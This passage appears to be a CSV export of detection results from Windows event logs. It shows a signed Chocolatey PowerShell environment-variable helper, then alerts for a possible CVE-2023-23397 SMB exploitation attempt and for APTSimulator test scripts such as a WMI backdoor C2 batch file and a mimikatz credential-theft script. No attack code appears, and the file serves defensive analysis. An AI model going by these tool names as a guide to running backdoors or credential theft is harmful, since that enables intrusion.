$Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","66cccc69-033d-56e2-a1e1-f190cc0a9ca0"
"2022-04-29 12:10:46.006 +02:00","Potential CVE-2023-23397 Exploitation Attempt - SMB","med","PEGASUS01","MS-Win-SmbCli/Conn",30804,59,"Address: 020001BDC0A8B7860000000000000000 ¦ AddressLength: 16 ¦ ConnectionType: 1 ¦ Reason: 7 ¦ ServerName: \192.168.183.134 ¦ ServerNameLength: 16 ¦ Status: 3221225996","-","de290ecb-3279-dd5b-2f6c-7d3f22a752d8"
"2022-04-29 12:13:22.410 +02:00","Potential CVE-2023-23397 Exploitation Attempt - SMB","med","PEGASUS01","MS-Win-SmbCli/Conn",30806,64,"Address: 020001BDC0A8B7860000000000000000 ¦ AddressLength: 16 ¦ ServerName: \192.168.183.134 ¦ ServerNameLength: 16 ¦ SessionId: 2837665060 ¦ Status: 0 ¦ TreeId: 0","-","de290ecb-3279-dd5b-2f6c-7d3f22a752d8"
"2022-05-08 20:53:25.556 +02:00","Potential CVE-2023-23397 Exploitation Attempt - SMB","med","PEGASUS01","MS-Win-SmbCli/Conn",30803,80,"AddressLength: 16 ¦ ConnectionType: 1 ¦ InstanceName: \Device\LanmanRedirector ¦ InstanceNameLength: 24 ¦ LocalAddress: 00000000000000000000000000000000 ¦ Reason: 4 ¦ RemoteAddress: 020001BDC0A8B7860000000000000000 ¦ ServerName: 192.168.183.134 ¦ ServerNameLength: 15 ¦ Status: 3221225653","-","de290ecb-3279-dd5b-2f6c-7d3f22a752d8"
"2022-05-08 21:04:52.827 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,105,"Threat: Trojan:BAT/Vigorf.A ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\command-and-control\wmi-backdoor-c2.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {3D6C0D67-CE0F-46AE-B9A6-DC31AFAFB0B7} ¦ Detection Time: 2022-05-08T19:04:52.390Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:BAT/Vigorf.A&threatid=2147714419&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147714419 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:04:53.529 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,107,"Threat: Trojan:Win32/Powersploit!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\credential-access\mimikatz-1.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {D7193C84-A3A6-4192-95C6-99F88759F52F} ¦ Detection Time: 2022-05-08T19:04:53.046Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powersploit!ml&threatid=2147760510&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147760510 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:04:56.552 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,108,"Threat: Trojan:BAT/Vigorf.A ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\command-and-control\wmi-backdoor-c2.bat; file:_C:\Users\IEUser\AppData\Local\Temp\dist\APTSimulator\test-sets\command-and-control\wmi-backdoor-c2.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {3D6C0D67-CE0F-46AE-B9A6-DC31AFAFB0B7} ¦ Detection Time: 2022-05-08T19:04:52.390Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:BAT/Vigorf.A&threatid=2147714419&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147714419 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ Unused:","810bfd3a-9fb3-44e0-9016-8cdf785fddbf"
"2022-05-08 21:04:56.600 +02:00","Defender Alert (Severe)","crit","PEGASUS01","Defender",1116,109,"Threat: Trojan:Win32/Powersploit!ml ¦ Severity: Severe ¦ Type: Trojan ¦ User: PEGASUS01\IEUser ¦ Path: file:_C:\Users\IEUser\AppData\Local\Temp\APTSimulator\test-sets\credential-access\mimikatz-1.bat; file:_C:\Users\IEUser\AppData\Local\Temp\dist\APTSimulator\test-sets\credential-access\mimikatz-1.bat ¦ Proc: C:\Windows\explorer.exe","Action ID: 9 ¦ Action Name: Not Applicable ¦ Additional Actions ID: 0 ¦ Additional Actions String: No additional actions required ¦ Category ID: 8 ¦ Detection ID: {D7193C84-A3A6-4192-95C6-99F88759F52F} ¦ Detection Time: 2022-05-08T19:04:53.046Z ¦ Engine Version: AM: 1.1.19200.5, NIS: 1.1.19200.5 ¦ Error Code: 0x00000000 ¦ Error Description: The operation completed successfully. ¦ Execution ID: 1 ¦ Execution Name: Suspended ¦ FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Powersploit!ml&threatid=2147760510&enterprise=0 ¦ Origin ID: 1 ¦ Origin Name: Local machine ¦ Post Clean Status: 0 ¦ Pre Execution Status: 0 ¦ Product Name: Microsoft Defender Antivirus ¦ Product Version: 4.18.2203.5 ¦ Remediation User: ¦ Security intelligence Version: AV: 1.363.1630.0, AS: 1.363.1630.0, NIS: 1.363.1630.0 ¦ Severity ID: 5 ¦ Source ID: 3 ¦ Source Name: Real-Time Protection ¦ State: 1 ¦ Status Code: 1 ¦ Status Description: ¦ Threat ID: 2147760510 ¦ Type ID: 8 ¦ Type Name: FastPath ¦ Unused2: ¦ Unused3: ¦ Unused4: ¦ Unused5: ¦ Unused6: ¦ 